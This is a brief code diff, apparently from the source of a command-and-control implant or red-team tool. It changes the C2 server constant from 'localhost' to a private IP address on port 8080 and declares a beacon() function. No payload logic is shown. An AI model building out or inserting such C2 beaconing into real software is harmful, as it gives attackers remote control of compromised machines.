@@ -1,6 +1,6 @@
 /* --- C2 connection properties --- */
 #define C2PORT 8080
-#define C2SERVER "localhost"
+#define C2SERVER "10.0.0.72"
 
 /* prototypes */
 static void beacon();
